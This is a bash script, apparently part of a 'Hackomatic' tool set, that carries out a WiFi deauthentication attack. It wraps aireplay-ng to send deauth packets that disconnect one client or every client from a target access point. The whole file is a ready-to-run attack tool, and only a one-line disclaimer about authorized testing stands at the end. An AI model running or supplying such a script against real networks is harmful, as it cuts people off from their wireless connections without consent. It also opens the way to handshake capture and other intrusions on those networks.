#!/bin/bash

# WiFi Deauth Attack Script for Hackomatic
# Author: Hackomatic Team
# Description: Perform deauthentication attack on WiFi networks

INTERFACE="$1"
BSSID="$2"
CLIENT="$3"

echo "WiFi Deauthentication Attack"
echo "============================"
echo "Interface: $INTERFACE"
echo "Target BSSID: $BSSID"
if [ -n "$CLIENT" ]; then
    echo "Target Client: $CLIENT"
else
    echo "Target: All clients"
fi

# Check if required tools are installed
if ! command -v aireplay-ng &> /dev/null; then
    echo "ERROR: aircrack-ng suite is not installed"
    echo "Please install: apt-get install aircrack-ng"
    exit 1
fi

# Validate inputs
if [ -z "$INTERFACE" ] || [ -z "$BSSID" ]; then
    echo "ERROR: Missing required parameters"
    echo "Usage: $0 <interface> <bssid> [client_mac]"
    exit 1
fi

# Check if interface is in monitor mode
if ! iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "ERROR: Interface $INTERFACE is not in monitor mode"
    echo "Please set the interface to monitor mode first"
    exit 1
fi

# Perform deauth attack
if [ -n "$CLIENT" ]; then
    echo "Sending deauth packets to specific client..."
    sudo aireplay-ng --deauth 10 -a "$BSSID" -c "$CLIENT" "$INTERFACE"
else
    echo "Sending deauth packets to all clients..."
    sudo aireplay-ng --deauth 10 -a "$BSSID" "$INTERFACE"
fi

echo "Deauth attack completed!"
echo "Note: This tool should only be used for authorized testing."
